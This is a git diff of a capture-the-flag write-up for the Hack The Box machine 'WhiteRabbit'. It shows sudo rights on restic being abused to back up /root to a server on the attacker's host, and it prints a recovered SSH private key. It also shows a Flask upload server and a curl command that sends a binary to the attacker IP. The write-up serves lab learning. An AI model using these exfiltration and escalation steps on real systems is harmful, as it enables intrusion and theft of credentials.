@@ -1,4 +1,8 @@
-## white-rabbit.htb
+## [white-rabbit.htb](https://app.hackthebox.com/machines/WhiteRabbit)
+
+### --USER FLAG--
+
+Scanning
 
 ```
 Hexada@hexada ~/Downloads$ sudo nmap -sS -sC -sV -p- -T5 --max-rate 10000 whiterabbit.htb                                                                                     
@@ -543,17 +547,117 @@ User bob may run the following commands on ebdce80611e9:
 ```
 
 ```
-bob@ebdce80611e9:~$ mkdir repo
+Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm$ mkdir root-repo
 
-bob@ebdce80611e9:~$ echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd
-
-bob@ebdce80611e9:~$ sudo restic init -r repo --password-file .restic_passwd
-
-bob@ebdce80611e9:~$ sudo restic backup /root -r repo --password-file .restic_passwd
-
-bob@ebdce80611e9:~$ ls repo
-config  data  index  keys  locks  snapshots
+Hexada@hexada ~/app/rest-server/cmd/rest-server$ ./rest-server --path /home/Hexada/pentest-env/vrm/white.rabbit.htb/dev/shm/root-repo --no-auth --listen :1717             130 ↵  ✭master 
+Data directory: /home/Hexada/pentest-env/vrm/white.rabbit.htb/dev/shm/root-repo
+Authentication disabled
+Append only mode disabled
+Private repositories disabled
+Group accessible repos disabled
+start server on [::]:1717
 ```
 
+```
+echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd
+
+sudo /usr/bin/restic -r rest:http://10.10.16.43:1717/root-repo init --password-file .restic_passwd
+
+sudo /usr/bin/restic -r rest:http://10.10.16.43:1717/root-repo backup /root --password-file .restic_passwd
+```
+
+```
+Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm/root-repo$ restic -r . --password-file ../.restic_passwd snapshots                                                                
+repository 4c4a8aae opened (version 2, compression level auto)
+created new cache in /home/Hexada/.cache/restic
+ID        Time                 Host          Tags        Paths
+--------------------------------------------------------------
+aa0caae4  2025-08-22 20:35:00  ebdce80611e9              /root
+--------------------------------------------------------------
+1 snapshots
+
+Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm/root-repo$ restic -r . --password-file ../.restic_passwd restore latest --target ./restored_root-repo                             
+repository 4c4a8aae opened (version 2, compression level auto)
+[0:00] 100.00%  1 / 1 index files loaded
+restoring snapshot aa0caae4 of [/root] at 2025-08-22 17:35:00.231996391 +0000 UTC by root@ebdce80611e9 to ./restored_root-repo
+Summary: Restored 8 files/dirs (3.865 KiB) in 0:00
+
+Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm/root-repo/restored_root-repo/root$ ls                                                                                             
+morpheus  morpheus.pub
+Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm/root-repo/restored_root-repo/root$ cat morpheus                                                                                   
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
+1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQS/TfMMhsru2K1PsCWvpv3v3Ulz5cBP
+UtRd9VW3U6sl0GWb0c9HR5rBMomfZgDSOtnpgv5sdTxGyidz8TqOxb0eAAAAqOeHErTnhx
+K0AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+w
+Ja+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR
+4AAAAhAIUBairunTn6HZU/tHq+7dUjb5nqBF6dz5OOrLnwDaTfAAAADWZseEBibGFja2xp
+c3QBAg==
+-----END OPENSSH PRIVATE KEY-----
+
+Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm/root-repo/restored_root-repo/root$ ssh -i morpheus morpheus@whiterabbit.htb                                                       
+Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Fri Aug 22 17:59:22 2025 from 10.10.16.43
+morpheus@whiterabbit:~$ ls
+user.txt
+```
+
+### --ROOT FLAG--
+
+```
++----+---------------------+------------------------------------------------------------------------------+
+| id | date                | command                                                                      |
++----+---------------------+------------------------------------------------------------------------------+
+| 1  | 2024-08-30 10:44:01 | uname -a                                                                     |
+| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |
+| 3  | 2024-08-30 11:58:36 | echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd                       |
+| 4  | 2024-08-30 11:59:02 | rm -rf .bash_history                                                         |
+| 5  | 2024-08-30 11:59:47 | #thatwasclose                                                                |
+| 6  | 2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd |
++----+---------------------+------------------------------------------------------------------------------+
+```
+
+It was run as root (because only root can reset passwords without being prompted for the old one)
+
+```
+morpheus@whiterabbit:/opt$ ls
+containerd  docker  neo-password-generator
+```
+
+<img width="1920" height="299" alt="image" src="https://github.com/user-attachments/assets/a3eb8907-ad08-49bf-b692-d7d50424729a" />
+
+```py
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/', methods=['POST'])
+def upload_file():
+    file = request.files.get('file')
+    if file:
+        file.save(file.filename)
+
+    return None, 400
+
+if __name__ == '__main__':
+    app.run(host='10.10.16.43', port=1818)
+```
+
+```
+morpheus@whiterabbit:/opt/neo-password-generator$ cp neo-password-generator ~/neo-password-generator
+
+curl -F "file=@neo-password-generator" http://10.10.16.43:1818/
+```
 
 
